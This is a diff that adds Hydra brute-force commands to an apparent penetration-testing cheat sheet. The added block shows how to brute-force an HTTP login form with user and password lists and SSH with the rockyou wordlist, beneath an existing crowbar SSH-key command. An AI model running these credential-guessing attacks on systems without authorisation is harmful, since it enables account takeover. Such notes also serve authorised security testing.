@@ -42,3 +42,19 @@ sudo ./crowbar.py -b sshkey -s 192.168.2.105/32 -u root -k ~/.ssh/id_rsa
   
 REF: https://github.com/galkan/crowbar
 ```
+
+```
+# Use Hydra to bruteforce HTTP login page and SSH
+
+# Use hydra to bruteforce a http login page
+hydra -L users.txt -P passwords.txt target http
+
+  -L  Username file
+  -P  Password file 
+  
+hydra -L users.txt -P passwords.txt url http-post-form "/index.php:username=^USER^&password=^PASS^&Submit=Sign+in" -vv -f
+
+  -v  Verbose
+  -f  Stop the attack when the first successful result found
+# Use hydra to bruteforce SSH 
+hydra -l user -P /usr/share/wordlists/rockyou.txt ssh://127.0.0.1
